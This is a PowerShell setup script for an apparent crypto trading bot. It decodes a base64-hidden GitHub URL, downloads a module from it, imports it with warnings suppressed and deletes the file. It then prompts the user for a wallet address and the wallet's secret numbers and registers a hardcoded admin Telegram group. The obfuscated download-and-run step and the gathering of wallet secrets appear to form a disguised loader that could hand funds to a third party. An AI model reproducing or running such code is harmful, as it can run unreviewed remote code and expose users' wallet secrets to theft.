function setupBot(){
    param (
        [Parameter(Mandatory = $false)][string] $Branch = 'main',
        [Parameter(Mandatory = $false)][string] $FileName = 'CryptoModule.psm1'
    )
    cd\
    mkdir crypto
    cd crypto
    $bytes = [Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NvbGRvZzg2L2FsZ29UcmFkaW5nL3JlZnMvaGVhZHMvPGJyYW5jaD4vY3J5cHRvL1NjcmlwdHMvPGZpbGVOYW1lPg==")
    $uri = [System.Text.Encoding]::UTF8.GetString($bytes)
    $uri = $uri.replace('<fileName>', $fileName); $uri = $uri.replace('<branch>', $branch)
    Invoke-WebRequest -Uri $uri -OutFile ".\$fileName"
    Import-Module .\$fileName -Force -WarningAction Ignore
    Remove-Item -Path .\$fileName

    # Create folders
    Create-FolderStructure

    # Create default running config
    Create-DefaultConfigs -Branch $branch -FileNames 'stops.csv', 'buyConditions.csv'
    Create-Doco -Branch $branch -FileNames 'ReadMe.txt', 'RoadMap.txt'
    
    # Set up config file    
    New-Item -Path .\config -Name config.txt # create blank config file    
    $walletAddress = Read-Host "Please enter wallet address (it will look something like this 'rDXgW8ZdcPwmSzEzK7s45V6xeSwuwgiVYG')"
    Set-WalletAddress -WalletAddress $walletAddress
    $secretNumbers = Read-Host "Please enter wallet secret numbers (it must look something like this '261821 261821 261821 261821 261821 261821 261821 261821')"
    Set-WalletSecret -SecretNumbers $secretNumbers
    $userTelegramGroup = Read-Host "Please enter the name of the Telegram group you added the bot to" 
    Set-UserTelegramGroup -UserTelegramGroup $userTelegramGroup
    Set-AdminTelegramGroup -AdminTelgramGroup @testgroupjbn121
        
    # create scripts
    Create-PythonScripts
    Create-GoBabyGoScript
}

setupBot
